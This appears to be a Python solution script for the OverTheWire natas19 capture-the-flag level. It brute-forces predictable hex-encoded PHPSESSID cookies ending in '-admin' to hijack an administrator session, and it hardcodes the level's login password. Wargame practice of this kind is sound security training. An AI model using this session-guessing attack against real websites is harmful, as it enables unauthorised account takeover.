import requests
import time

url = 'http://natas19.natas.labs.overthewire.org'
user = 'natas19'
password = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'

s = requests.Session()

for i in range(0, 641):
    i_str = str(i)
    i_hex = ''
    for c in i_str:
        i_hex = i_hex + format(ord(c), 'x')

    cookie = i_hex + '2d61646d696e'
    s.cookies.set('PHPSESSID', cookie) 

    requests = s.get(url, auth=(user, password))
    if ('You are an admin' in requests.text):
        print(requests.text)
        print(f'O número é {i}')    
